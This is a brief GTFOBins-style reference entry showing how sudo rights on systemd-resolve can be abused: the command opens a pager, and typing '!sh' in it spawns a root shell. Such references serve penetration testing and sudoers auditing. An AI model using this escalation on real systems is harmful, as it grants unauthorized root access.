# GTFOBin: systemd-resolve

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

This invokes the default pager, which is likely to be `less`, other functions may apply.

```
sudo systemd-resolve --status
!sh
```